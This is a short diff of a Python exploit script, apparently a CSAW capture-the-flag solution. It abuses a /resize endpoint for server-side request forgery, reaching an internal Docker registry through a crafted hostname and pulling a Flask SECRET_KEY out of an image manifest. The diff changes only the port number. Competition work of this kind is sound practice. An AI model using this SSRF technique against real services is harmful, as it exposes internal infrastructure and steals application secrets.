@@ -1,8 +1,8 @@
 import requests
 
-print(requests.get('http://red.chal.csaw.io:8268/resize', params={'url': 'http://red.chal.csaw.io.2.as65535.net:5000/v2/_catalog'}).text)
+print(requests.get('http://red.chal.csaw.io:8268/resize', params={'url': 'http://red.chal.csaw.io.2.as65535.net:9000/v2/_catalog'}).text)
 
-asdf = requests.get('http://red.chal.csaw.io:8268/resize', params={'url': 'http://red.chal.csaw.io.2.as65535.net:5000/v2/resizer/manifests/latest'}).text
+asdf = requests.get('http://red.chal.csaw.io:8268/resize', params={'url': 'http://red.chal.csaw.io.2.as65535.net:9000/v2/resizer/manifests/latest'}).text
 secret = asdf.split('SECRET_KEY=')[1].split(' ')[0]
 print(f"got flask secret {secret}")
 
